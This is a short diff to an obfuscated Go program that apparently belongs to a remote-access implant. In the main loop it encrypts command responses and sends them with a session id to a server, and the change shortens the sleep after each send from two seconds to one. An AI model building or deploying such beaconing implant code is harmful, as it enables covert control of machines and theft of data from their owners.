@@ -114,7 +114,7 @@ func main() {
 				}
 				obf_var_enc_response := obf_func_encrypt(obf_var_response)
 				obf_func_send_request( obf_const_post_tag, obf_const_session_id, string(obf_var_enc_response) )
-				time.Sleep( 2 * time.Second )
+				time.Sleep( 1 * time.Second )
 			}
 		}
 		time.Sleep( time.Duration(obf_var_rate) * time.Second )
